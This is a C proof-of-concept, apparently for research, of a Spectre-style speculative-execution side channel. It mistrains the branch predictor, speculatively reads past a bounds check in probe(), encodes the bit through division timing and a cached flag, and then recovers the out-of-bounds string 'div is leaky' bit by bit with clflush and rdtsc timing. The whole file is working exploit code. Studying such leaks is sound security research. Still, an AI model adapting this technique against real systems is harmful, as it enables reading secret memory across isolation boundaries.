#include <stdio.h>
#include <stdalign.h>
#include <stdbool.h>
#include <x86intrin.h>
#include <string.h>

#define PUBLEN 32
#define PUBBITS (PUBLEN * 8)

int verbose = 0;

#define threshold 50

int publen = PUBLEN;
char buf[PUBLEN * 2];
alignas(4096) __attribute__((section(".mysection"))) char pad = 1;
alignas(4096) __attribute__((section(".mysection"))) char flag = 12;
alignas(4096) __attribute__((section(".mysection"))) int *p1 = &publen;
alignas(4096) __attribute__((section(".mysection"))) int **p2 = &p1;
alignas(4096) __attribute__((section(".mysection"))) int ***p3 = &p2;
alignas(4096) __attribute__((section(".mysection"))) char dummy = 1;
alignas(4096) __attribute__((section(".mysection"))) char dummy2 = 1;

static inline unsigned get_bit_raw(char *buf, unsigned byte_idx, unsigned bit_idx) {
#if 0
  return (buf[byte_idx] >> bit_idx) & 1;
#else
  unsigned result;
  asm ("xor %%eax, %%eax\n" // Flags need to be cleared.
       "mov %1, %%al\n"
       "shr %%cl, %%al\n"
       "and $1, %%al\n"
       : "=&a"(result)
       : "m"(buf[byte_idx]), "c"(bit_idx));
  return result;
#endif
}

static __attribute__((noinline)) void probe(char *buf, char *flag, unsigned byte_idx, unsigned bit_idx) {
  // int len = ***p3;
  int len = publen;
  if (byte_idx >= len)
    return;
  asm volatile ("mov %0, %%al" :: "m"(flag) : "al");
  unsigned val = get_bit_raw(buf, byte_idx, bit_idx);
#if 1
  asm ("mov %0, %%ecx\n"
       "mov $0, %%ax\n"
       "div %%cl\n"
       : "+r"(val)
       :: "rcx", "rax", "rdx");
#endif
#if 0
  volatile int x = flag[4096 - 4096 * val];
#elif 1
  volatile int x = flag[val];
#elif 0
  volatile int x = flag;
#endif
}

static int time_access(char *p) {
  _mm_lfence();
  unsigned long start = __rdtsc();
  char junk;
  asm volatile ("mov %1, %0" : "=r"(junk) : "m"(*p));
  _mm_lfence();
  unsigned long end = __rdtsc();
  return end - start;
}

static struct {
  int byte;
  int bit;
} order [8 * PUBLEN];

static void init(void) {
  memset(buf, -1, PUBLEN);
  strcpy(buf + PUBLEN, "div is leaky");

  for (int i = 0; i < PUBBITS; ++i) {
    int byte = i / 8;
    int bit = i % 8;
    order[i].byte = i / 8;
    order[i].bit = i % 8;
  }
}

static int leak_bit(char *buf, int byte_idx, int bit_idx) {
  int idx = PUBLEN * 4;
  order[idx].byte = byte_idx;
  order[idx].bit = bit_idx;
  // Mistrain the branch predictor.
  int ts[PUBBITS];
  for (int i = 0; i < PUBBITS; ++i) {
    _mm_clflush(&flag);
    _mm_clflush(&publen);
    _mm_clflush(&p1);
    _mm_clflush(&p2);
    _mm_clflush(&p3);
    _mm_lfence();
    _mm_mfence();
    probe(buf, &flag, order[i].byte, order[i].bit);
    ts[i] = time_access(&flag);
  }
  order[idx].byte = idx / 8;
  order[idx].bit = idx % 8;

  // Check if the flag was cached.
  int t = ts[idx];
  if (verbose) {
    printf("%d\t%d\n", get_bit_raw(buf, byte_idx, bit_idx), t);
    fflush(stdout);
  }
  return t < threshold;
}

int main() {
  init();
  char msg[sizeof buf];
  memset(msg, 0, sizeof msg);
  for (int i = 0; i < sizeof buf; ++i) {
#if 1
    char byte = 0;
    for (int j = 0; j < 8; ++j) {
      const int bit = leak_bit(&buf[0], i, j);
      byte |= bit << j;
    }
    msg[i] = byte;
#else
    leak_bit(&buf[0], i, 0);
#endif
  }
  printf("Message: %s\n", msg);
}
